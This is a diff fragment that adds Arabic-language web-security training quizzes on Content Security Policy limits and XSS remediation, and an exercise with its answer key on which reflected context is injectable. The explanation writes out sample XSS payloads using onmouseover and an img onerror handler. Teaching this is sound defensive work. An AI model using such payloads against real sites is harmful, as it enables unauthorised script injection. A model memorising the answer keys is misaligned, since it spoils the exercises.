+            <good>الهجمات اللي مش محتاجة JavaScript بتعيش بعد الـ CSP. عشان كده الـ CSP الكويسة فيها `form-action` و`base-uri` كمان.</good>
+            <bad>الـ CSP بتوقف تنفيذ الـ scripts، بس HTML injection لسه يقدر يسرّب بيانات بلينكات/صور/فورمز.</bad>
+          </quiz>
+          <quiz id="s16-q6" answer="0">
+            <q>إيه أحسن إصلاح لـ XSS في صفحة بتعرض اسم المستخدم؟</q>
+            <o>HTML output encoding (الأفضل auto-escaping من الـ template engine) وقت الإخراج</o>
+            <o>WAF بيمنع كلمة script</o>
+            <o>تشيل `<` من الـ input وقت التسجيل بس</o>
+            <o>تخلّي الـ cookie HttpOnly</o>
+            <good>الـ encoding وقت الإخراج حسب الـ context هو الإصلاح. الباقي طبقات إضافية.</good>
+            <bad>الـ WAFs والـ blocklists بتتعدّى (شفت الـ Range). والـ HttpOnly بتقلل الـ impact بس. الإصلاح: encoding صح عند كل مكان بيطلع فيه الـ input.</bad>
+          </quiz>
+          <task id="s16-t1" title="فين الـ context الضعيف؟" level="2" answer="4" reject="3|1|2">
+            <desc><p>بعت canary <code>zq9'"&lt;&gt;</code> في parameter اسمه <code>ref</code>، ولقيته في 4 أماكن في الـ response. <b>رقم السطر</b> (1–4) اللي تقدر تخرج منه من الـ context بتاعه؟</p></desc>
+            <listing lang="html" file="response.html (excerpt)">
+              <title>Ref: zq9'&quot;&lt;&gt;</title>
+              <input type="hidden" name="ref" value="zq9'&quot;&lt;&gt;">
+              <script>var ref = "zq9'\"<>";</script>
+              <a href='/back?ref=zq9'"<>'>Back</a>
+            </listing>
+            <hint>في كل سطر: أنهي حرف بيقفل الـ context ده، وهل رجع خام ولا متعمّله encode/escape؟</hint>
+            <explain>السطر <b>4</b>. (1) جوه `title` (RCDATA) والـ `<` متعمّلها encode → مفيش `</title>`. (2) الـ attribute محوط بـ `"` والـ `"` بقت `&quot;`. (3) JS string محوط بـ `"` والـ `"` متعمّلها `\"` والـ `<` بقت `<` → مفيش خروج من الـ string ولا `</script>`. (4) الـ `href` محوط بـ <b>single quotes</b> والـ `'` رجعت <b>خام</b> → بتقفل الـ attribute: `ref=x' onmouseover='alert(1)` أو `'><img src=x onerror=alert(1)>` (لأن `<>` خام كمان). نفس الـ canary، 4 contexts، 4 نتايج مختلفة.</explain>
+          </task>
+        </div>
+      </section>
